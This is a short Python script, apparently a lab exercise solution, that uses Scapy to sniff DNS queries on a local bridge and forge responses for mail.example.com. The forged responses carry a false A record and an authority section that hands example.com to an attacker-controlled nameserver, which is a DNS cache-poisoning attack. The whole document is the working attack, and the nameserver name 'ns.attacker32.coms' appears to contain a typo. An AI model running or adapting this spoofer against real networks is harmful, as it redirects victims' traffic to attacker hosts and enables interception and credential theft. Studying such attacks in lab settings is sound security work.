#!/usr/bin/env python3
from scapy.all import *

def dnsSpoofing(pkt):
  if (DNS in pkt and 'mail.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
    pkt.show()
    
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)


    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    # Answer section of the packet that is to be sent
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='5.6.7.8')

    # Authority section of packet for NS spoofing
    NSsec1 = DNSRR(rrname='example.com', type='NS',
                   ttl=259200, rdata='ns.attacker32.coms')

    # DNS packet construction that is sent when it is spoofedt
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=1, arcount=0,
                 an=Anssec, ns=NSsec1)

    # sending out the spoofed packet
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)

# Sniffing the incoming packets and invoking spoofing function
f = 'udp and src host 10.9.0.53 and dst port 53'
pkt = sniff(iface='br-4007a48b98ca', filter=f, prn=dnsSpoofing)      
